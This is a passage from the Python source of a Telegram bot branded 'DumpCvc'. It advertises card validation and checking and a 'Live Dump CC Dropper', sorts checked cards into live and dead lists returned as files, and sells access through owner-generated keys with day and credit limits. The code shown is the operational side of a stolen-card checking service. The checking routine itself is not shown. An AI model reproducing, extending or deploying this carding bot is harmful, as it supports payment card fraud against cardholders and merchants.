            await self.send_msg(chat_id, f"⚠️ Group ID <code>{group_id}</code> not found!", reply_to_message_id=reply_to)
            return
        
        groups.remove(group_id)
        Database.save("group", groups)
        
        await self.send_msg(chat_id, f"✅ Group ID <code>{group_id}</code> removed successfully!\n\n📊 Total groups: {len(groups)}", reply_to_message_id=reply_to)
    
    async def handle_key(self, message: Dict):
        """Handle /key command"""
        user_id = message["from"]["id"]
        chat_id = message["chat"]["id"]
        reply_to = message.get("message_id")
        
        if user_id != OWNER_ID:
            await self.send_msg(chat_id, "❌ This command is only for the owner!", reply_to_message_id=reply_to)
            return
        
        text = message["text"].strip()
        parts = text.split(maxsplit=1)
        
        if len(parts) < 2:
            await self.send_msg(chat_id, "❌ Usage: /key [days]|[credits]\n\nExample: /key 30|100", reply_to_message_id=reply_to)
            return
        
        try:
            params = parts[1].split("|")
            if len(params) != 2:
                await self.send_msg(chat_id, "❌ Invalid format! Use: /key [days]|[credits]", reply_to_message_id=reply_to)
                return
            
            days = int(params[0])
            credits = int(params[1])
        except ValueError:
            await self.send_msg(chat_id, "❌ Invalid values! Days and credits must be numbers.", reply_to_message_id=reply_to)
            return
        
        key = secrets.token_hex(8).upper()
        expiry_timestamp = int(datetime.now().timestamp()) + (days * 24 * 60 * 60)
        
        keys = Database.load("keys")
        
        keys[key] = {
            "days": days,
            "credits": credits,
            "expiry": expiry_timestamp,
            "status": "NotClaimed"
        }
        
        Database.save("keys", keys)
        
        key_info = f"""
✅ <b>Key Generated Successfully!</b>

<b>🔑 Key:</b> <code>{key}</code>
<b>⏰ Days:</b> {days}
<b>💰 Credits:</b> {credits}
<b>📅 Expiry:</b> {datetime.fromtimestamp(expiry_timestamp).strftime('%Y-%m-%d %H:%M:%S')}
<b>📊 Status:</b> NotClaimed

Users can claim this key using:
<code>/claim {key}</code>
"""
        
        await self.send_msg(chat_id, key_info, reply_to_message_id=reply_to)
    
    async def handle_stats(self, message: Dict):
        """Handle /stats command"""
        user_id = message["from"]["id"]
        chat_id = message["chat"]["id"]
        reply_to = message.get("message_id")
        
        if user_id != OWNER_ID:
            await self.send_msg(chat_id, "❌ This command is only for the owner!", reply_to_message_id=reply_to)
            return
        
        users = Database.load("users")
        keys = Database.load("keys")
        groups = Database.load("group")
        
        total_users = len(users)
        active_users = sum(1 for u in users.values() if u.get("Expiry", "0") != "0")
        total_keys = len(keys)
        claimed_keys = sum(1 for k in keys.values() if k.get("status") == "Claimed")
        total_groups = len(groups) if isinstance(groups, list) else 0
        
        stats_text = f"""
📊 <b>Bot Statistics</b>

👥 <b>Users:</b>
• Total: {total_users}
• Active: {active_users}
• Inactive: {total_users - active_users}

🔑 <b>Keys:</b>
• Total: {total_keys}
• Claimed: {claimed_keys}
• Available: {total_keys - claimed_keys}

📢 <b>Groups:</b>
• Total: {total_groups}

🤖 <b>System:</b>
• Active Sessions: {len([s for s in self.active_sessions.values() if s.get('active')])}
"""
        
        await self.send_msg(chat_id, stats_text, reply_to_message_id=reply_to)
    
    async def handle_broadcast(self, message: Dict):
        """Handle /broadcast command"""
        user_id = message["from"]["id"]
        chat_id = message["chat"]["id"]
        reply_to = message.get("message_id")
        
        if user_id != OWNER_ID:
            await self.send_msg(chat_id, "❌ This command is only for the owner!", reply_to_message_id=reply_to)
            return
        
        text = message["text"].strip()
        parts = text.split(maxsplit=1)
        
        if len(parts) < 2:
            await self.send_msg(chat_id, "❌ Usage: /broadcast [message]\n\nExample: /broadcast Hello everyone!", reply_to_message_id=reply_to)
            return
        
        broadcast_msg = parts[1]
        users = Database.load("users")
        
        success = 0
        failed = 0
        
        status_msg = await self.send_msg(chat_id, f"📤 Broadcasting to {len(users)} users...", reply_to_message_id=reply_to)
        
        for user_key in users.keys():
            try:
                await self.send_msg(int(user_key), broadcast_msg)
                success += 1
                await asyncio.sleep(0.05)
            except:
                failed += 1
        
        final_text = f"✅ Broadcast completed!\n\n✅ Success: {success}\n❌ Failed: {failed}"
        if status_msg:
            await self.edit_msg(chat_id, status_msg["message_id"], final_text)
    
    async def handle_callback_query(self, callback_query: Dict):
        """Handle callback queries"""
        data = callback_query.get("data")
        message = callback_query.get("message")
        from_user = callback_query.get("from")
        callback_id = callback_query.get("id")
        chat_id = message["chat"]["id"]
        message_id = message["message_id"]
        current_user_id = from_user["id"]
        
        if ":" in data:
            action, original_user_id = data.split(":", 1)
            original_user_id = int(original_user_id)
        else:
            action = data
            original_user_id = None
        
        if original_user_id and current_user_id != original_user_id:
            await self.answer_callback_query(
                callback_id,
                "❌ This button is not for you!",
                show_alert=True
            )
            return
        
        if action == "show_commands":
            await self.answer_callback_query(callback_id)
            await self.handle_cmds(message, edit_mode=True, original_user_id=original_user_id)
        
        elif action == "start":
            await self.answer_callback_query(callback_id)
            first_name = from_user.get("first_name", "User")
            
            status_text = "👋 <b>Welcome back!</b>"
            
            welcome_text = f"""
{status_text}

<b>Hello {first_name}!</b>

✨ <u>Available Features</u>  
- Card Validation & Checking  
- Live Dump CC Dropper  

📌 Use <b>/cmds</b> to view all available commands.  

——————————————  
<b>⚡ Powered by DumpCvc 🗑️</b>
"""
            
            inline_keyboard = {
                "inline_keyboard": [
                    [{"text": "📋 Commands", "callback_data": f"show_commands:{original_user_id}"}],
                    [{"text": "ℹ️ About", "callback_data": f"about:{original_user_id}"}, 
                     {"text": "👤 Owner", "url": f"tg://user?id={OWNER_ID}"}]
                ]
            }
            
            await self.edit_msg(chat_id, message_id, welcome_text, reply_markup=inline_keyboard)
        
        elif action == "about":
            await self.answer_callback_query(callback_id)
            about_text = """
<b>ℹ️ About This Bot</b>

<b>Version:</b> 2.0.0
<b>Developer:</b> U8I3O 
<b>Features:</b> Card Checking, User Management

Built with Python & asyncio for high performance.
"""
            inline_keyboard = {
                "inline_keyboard": [
                    [{"text": "🔙 Back", "callback_data": f"start:{original_user_id}"}]
                ]
            }
            await self.edit_msg(chat_id, message_id, about_text, reply_markup=inline_keyboard)
        
        elif action == "stop_session":
            await self.answer_callback_query(callback_id, "🛑 Stopping session...")
            if original_user_id in self.active_sessions:
                self.active_sessions[original_user_id]["active"] = False
        
        elif action == "get_live":
            await self.answer_callback_query(callback_id)
            if original_user_id in self.active_sessions:
                live_cards = self.active_sessions[original_user_id].get('live_cards', [])
                if live_cards:
                    live_text = "\n".join(live_cards)
                    await self.send_document(chat_id, live_text, "live_cards.txt", "🟢 Live Cards")
                else:
                    await self.answer_callback_query(callback_id, "No live cards found!", show_alert=True)
        
        elif action == "get_dead":
            await self.answer_callback_query(callback_id)
            if original_user_id in self.active_sessions:
                dead_cards = self.active_sessions[original_user_id].get('dead_cards', [])
                if dead_cards:
                    dead_text = "\n".join(dead_cards)
                    await self.send_document(chat_id, dead_text, "dead_cards.txt", "🔴 Dead Cards")
                else:
                    await self.answer_callback_query(callback_id, "No dead cards found!", show_alert=True)
        
        elif action == "noop":
            await self.answer_callback_query(callback_id)
    
    async def handle_message(self, message: Dict):
        """Handle incoming messages"""
        user_id = message["from"]["id"]
        first_name = message["from"].get("first_name", "User")
        username = message["from"].get("username", "")
        self.register_user(user_id, first_name, username)
        
        if "text" not in message:
            if "document" in message and user_id == OWNER_ID:
                await self.handle_chk(message)
            return
        
        text = message["text"]
        
        if text == "/start":
            await self.handle_start(message)
        elif text == "/cmds":
            await self.handle_cmds(message)
        elif text == "/chk" or text.startswith("/chk"):
            await self.handle_chk(message)
        elif text.startswith("/b3"):
            await self.handle_b3(message)
        elif text == "/info":
            await self.handle_info(message)
        elif text.startswith("/adgr"):
            await self.handle_adgr(message)
        elif text.startswith("/degr"):
            await self.handle_degr(message)
        elif text.startswith("/key"):
            await self.handle_key(message)
        elif text.startswith("/claim"):
            await self.handle_claim(message)
        elif text.startswith("/stats"):
            await self.handle_stats(message)
        elif text.startswith("/broadcast"):
            await self.handle_broadcast(message)
    
    async def process_update(self, update: Dict):
        """Process a single update"""
        if "message" in update:
            await self.handle_message(update["message"])
        elif "callback_query" in update:
            await self.handle_callback_query(update["callback_query"])
    
    async def run(self):
        """Main bot loop"""
        print("🤖 Bot started successfully!")
        print(f"👤 Owner ID: {OWNER_ID}")
        print(f"📢 Target Group: {TARGET_GROUP_ID}")
        print("⏳ Waiting for messages...\n")
        
        try:
            while True:
                updates = await self.get_updates()
                
                for update in updates:
                    try:
                        await self.process_update(update)
                    except Exception as e:
                        print(f"Error processing update: {e}")
                
                await asyncio.sleep(0.1)
        except KeyboardInterrupt:
            print("\n🛑 Bot stopped by user")
        finally:
            await self.close_session()


async def main():
    """Initialize and run the bot"""
    Database.init_databases()
    bot = TelegramBot()
    await bot.run()


if __name__ == "__main__":
    asyncio.run(main())